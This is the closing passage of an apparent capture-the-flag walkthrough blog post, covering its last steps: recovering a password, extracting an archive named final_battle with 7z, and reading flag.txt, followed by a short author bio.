<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-y48DSxdSDyo/WoVaQ1zrlDI/AAAAAAAAUsc/1e7TxncVaOYOHmlc72kIsaZsQWdWOFIZwCEwYBhgL/s1600/52.png" border="0" data-original-height="187" data-original-width="750"/></span></p>
<p><span style="color: #000000;">We run the program and find the password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EyRYHwdHzIM/WoVaRVQpC9I/AAAAAAAAUrs/SV-9yR-rmT8Zg3zsj0NDQjsf1NedxvPCgCEwYBhgL/s1600/53.png" border="0" data-original-height="53" data-original-width="371"/></span></p>
<p><span style="color: #000000;">We use zip to extract the file and use this password.</span></p>
<pre class="lang:default decode:true  ">7z e final_battle</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-arj0jI-Dl5c/WoVaR8-_AgI/AAAAAAAAUsc/eDBhLM7S2X8JbwZ5K2jL4Yqtt8TSdblPwCEwYBhgL/s1600/54.png" border="0" data-original-height="355" data-original-width="643"/></span></p>
<p><span style="color: #000000;">We find that a file called flag.txt was extracted, we open the file and find our final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lxQKXvA28XM/WoVaRh2SmuI/AAAAAAAAUsQ/64aSSiD2MuAtcNokRZYF9iZ9VgRThcoAACEwYBhgL/s1600/55.png" border="0" data-original-height="375" data-original-width="642"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
